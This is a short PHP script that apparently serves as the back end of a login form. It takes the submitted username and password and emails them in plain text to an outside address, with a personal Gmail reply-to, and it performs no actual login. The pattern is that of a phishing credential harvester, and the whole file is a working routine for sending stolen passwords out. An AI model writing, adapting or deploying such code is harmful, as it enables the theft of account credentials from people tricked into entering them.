<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect the form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $ssl = isset($_POST['ssl']) ? 'Yes' : 'No';

    // Set the recipient email address
    $to = 'placeholder@example.com';

    // Set the email subject
    $subject = 'New Login Form Submission';

    // Set the email body
    $message = "Username: $username\n";
    $message .= "Password: $password\n";
    $message .= "SSL: $ssl\n";

    // Set the email headers
    $headers = "From: noreply@yourdomain.com\r\n";
    $headers .= "Reply-To: stcloudgeorge@gmail.com\r\n";

    // Send the email
    mail($to, $subject, $message, $headers);
}
?>